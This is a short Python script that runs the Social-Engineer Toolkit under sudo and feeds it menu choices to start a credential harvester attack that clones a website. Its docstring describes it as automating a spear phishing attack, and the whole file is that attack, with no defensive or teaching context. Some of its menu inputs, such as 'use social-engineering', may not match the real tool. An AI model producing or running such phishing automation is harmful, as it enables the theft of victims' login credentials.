import subprocess

def spear_phishing_attack():
    """
    Automate a spear phishing attack using SET.

    Returns:
    None
    """
    print("Starting spear phishing attack...")
    commands = [
        "use social-engineering",
        "1",  # Social Engineering Attacks
        "2",  # Website Attack Vectors
        "3",  # Credential Harvester Attack Method
        "1",  # Web Templates
        "http://example.com",  # URL to clone
        "run"
    ]
    subprocess.run(["sudo", "setoolkit"], input="\n".join(commands) + "\n", text=True)

# Example usage
spear_phishing_attack()
